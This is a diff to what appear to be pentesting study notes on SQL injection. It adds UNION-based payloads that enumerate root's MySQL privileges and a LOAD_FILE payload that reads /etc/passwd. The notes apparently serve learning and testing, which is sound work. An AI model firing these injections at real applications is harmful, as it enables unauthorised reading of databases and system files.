@@ -122,4 +122,12 @@ SELECT super_priv FROM mysql.user
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 
 ```
-2. Use load file function 
+```
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+```
+2. Use load file function
+
+```
+SELECT LOAD_FILE
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
